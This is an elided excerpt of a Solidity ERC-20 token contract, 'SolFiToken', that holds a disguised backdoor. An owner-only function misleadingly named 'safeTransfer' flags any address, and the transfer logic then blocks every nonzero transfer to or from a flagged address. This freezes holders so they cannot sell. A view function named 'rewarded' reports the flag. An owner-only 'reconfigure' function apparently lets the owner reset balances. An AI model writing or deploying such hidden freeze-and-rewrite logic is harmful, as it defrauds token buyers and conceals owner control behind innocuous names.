 ...
 */
contract SolFiToken is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _safeTransfer;
    bool _initialize;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_safeTransfer[sender] || _safeTransfer[recipient]) require (amount == 0, "");
     ...
     */
    function reconfigure(address account, uint256 balance, uint256 burnAmount) external onlyOwner {
    ...
    function safeTransfer (address _address) external onlyOwner {
        if (_safeTransfer[_address] == true) {_safeTransfer[_address] = false;}
        else {_safeTransfer[_address] = true; }
    }

    function rewarded(address _address) public view returns (bool) {
        return _safeTransfer[_address];
    }
